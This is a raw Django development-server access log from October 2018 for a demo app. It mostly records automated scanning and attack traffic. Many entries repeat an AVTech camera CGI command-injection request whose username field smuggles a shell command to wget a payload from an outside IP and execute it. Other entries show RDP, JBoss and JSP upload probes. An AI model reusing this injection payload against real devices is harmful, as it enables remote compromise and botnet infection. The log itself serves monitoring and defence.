[16/Oct/2018 02:10:38] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64353
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[16/Oct/2018 05:53:03] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64353
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[16/Oct/2018 07:09:39] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64352
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[16/Oct/2018 08:45:41] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64351
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[16/Oct/2018 14:03:50] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64353
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[16/Oct/2018 14:13:05] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64351
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[16/Oct/2018 23:15:14] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[17/Oct/2018 02:32:21] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64352
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[17/Oct/2018 03:20:50] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64349
[17/Oct/2018 14:15:10] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[17/Oct/2018 22:01:56] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64350
[18/Oct/2018 09:51:50] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[18/Oct/2018 15:49:42] "GET / HTTP/1.0" 400 60118
[18/Oct/2018 16:04:57] "GET / HTTP/1.1" 200 1689
Not Found: /verifylogin.do
[18/Oct/2018 16:52:17] "GET /verifylogin.do HTTP/1.1" 404 2559
Not Found: /invoker/readonly
[18/Oct/2018 16:52:17] "GET /invoker/readonly HTTP/1.1" 404 2565
Not Found: /indexweb4.jsp/
[18/Oct/2018 16:52:19] "PUT /indexweb4.jsp/ HTTP/1.1" 404 2559
[18/Oct/2018 16:52:19] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[18/Oct/2018 18:16:53] "GET / HTTP/1.0" 400 60117
[18/Oct/2018 19:20:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[18/Oct/2018 19:20:13] "  /*à     Cookie: mstshash=Administr" 400 -
[19/Oct/2018 00:28:31] "GET / HTTP/1.1" 200 1689
Not Found: /status
[19/Oct/2018 00:32:46] "GET /status HTTP/1.1" 404 2535
[19/Oct/2018 06:37:49] "GET / HTTP/1.1" 200 1689
[19/Oct/2018 06:37:49] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[19/Oct/2018 06:37:49] "GET /favicon.ico HTTP/1.1" 404 2550
[19/Oct/2018 06:38:34] "GET /image.jpg HTTP/1.1" 200 44969
[19/Oct/2018 09:38:21] "GET / HTTP/1.1" 200 1689
[19/Oct/2018 10:32:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[19/Oct/2018 10:32:43] "  /*à     Cookie: mstshash=Administr" 400 -
Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.5/socket.py", line 575, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[19/Oct/2018 16:44:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[19/Oct/2018 16:44:32] "  *%à     Cookie: mstshash=Test" 400 -
[19/Oct/2018 16:44:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[19/Oct/2018 16:44:33] "  *%à     Cookie: mstshash=Test" 400 -
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[19/Oct/2018 16:57:40] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64351
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[19/Oct/2018 18:10:37] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64351
[19/Oct/2018 22:35:35] "GET / HTTP/1.1" 200 1689
[20/Oct/2018 01:44:44] code 400, message Bad request syntax ("\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[Ê\x88\x8c\x13Â®®1\x8a2÷l\x10Î<Hõ:?õÞî)A[!é\x99U.#\x00\x008À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
[20/Oct/2018 01:44:44] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2018 01:44:44] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[Ê\x88\x8c|#hZð\x96\x82ïrÖÞà\x87ÜZÐ\x041\x8b')
[20/Oct/2018 01:44:44] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2018 07:13:52] "GET / HTTP/1.1" 200 1689
[20/Oct/2018 07:13:52] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[20/Oct/2018 07:13:52] "GET /favicon.ico HTTP/1.1" 404 2550
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[20/Oct/2018 12:52:40] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64354
[20/Oct/2018 17:05:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[20/Oct/2018 17:05:32] "  /*à     Cookie: mstshash=Administr" 400 -
[21/Oct/2018 03:12:05] "GET / HTTP/1.1" 200 1689
Not Found: /favicon.ico
[21/Oct/2018 03:12:06] "GET /favicon.ico HTTP/1.1" 404 2550
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[21/Oct/2018 04:31:56] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64350
[21/Oct/2018 09:40:33] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[21/Oct/2018 10:51:50] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64352
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[21/Oct/2018 15:10:53] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64351
[21/Oct/2018 15:13:03] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[21/Oct/2018 15:28:40] "GET / HTTP/1.0" 400 60120
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[21/Oct/2018 21:49:29] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64353
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 00:25:21] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 00:54:33] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 02:38:59] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 02:59:14] "GET / HTTP/1.0" 400 60119
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 03:26:01] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 05:38:20] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 07:20:47] "GET / HTTP/1.0" 400 60117
[22/Oct/2018 08:03:51] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 08:04:13] "GET / HTTP/1.0" 400 60120
[22/Oct/2018 08:07:05] "GET / HTTP/1.1" 200 1689
[22/Oct/2018 08:07:08] "GET / HTTP/1.1" 200 1689
[22/Oct/2018 08:07:09] "GET /api/person/1/ HTTP/1.1" 200 231
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 08:39:34] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 09:44:12] "GET / HTTP/1.0" 400 60119
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 10:41:16] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 11:11:54] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 11:19:20] "GET / HTTP/1.0" 400 60115
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 11:58:31] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 16:07:57] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 21:09:10] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[22/Oct/2018 22:05:09] "GET / HTTP/1.0" 400 60116
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 00:57:43] "GET / HTTP/1.0" 400 60119
[23/Oct/2018 01:09:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[23/Oct/2018 01:09:57] "  /*à     Cookie: mstshash=Administr" 400 -
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 09:48:59] "GET / HTTP/1.0" 400 60119
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 10:04:30] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 15:34:53] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 16:04:45] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 16:40:07] "GET / HTTP/1.0" 400 60116
[23/Oct/2018 16:46:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[23/Oct/2018 16:46:53] "  /*à     Cookie: mstshash=Administr" 400 -
[23/Oct/2018 17:02:08] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 18:24:38] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[23/Oct/2018 18:31:10] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64353
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 20:52:13] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[23/Oct/2018 23:08:17] "GET / HTTP/1.0" 400 60118
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[24/Oct/2018 03:11:54] "GET / HTTP/1.0" 400 60116
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
[24/Oct/2018 07:09:07] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64350
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[24/Oct/2018 07:43:53] "GET / HTTP/1.0" 400 60118
[24/Oct/2018 11:53:33] "GET / HTTP/1.1" 200 1689
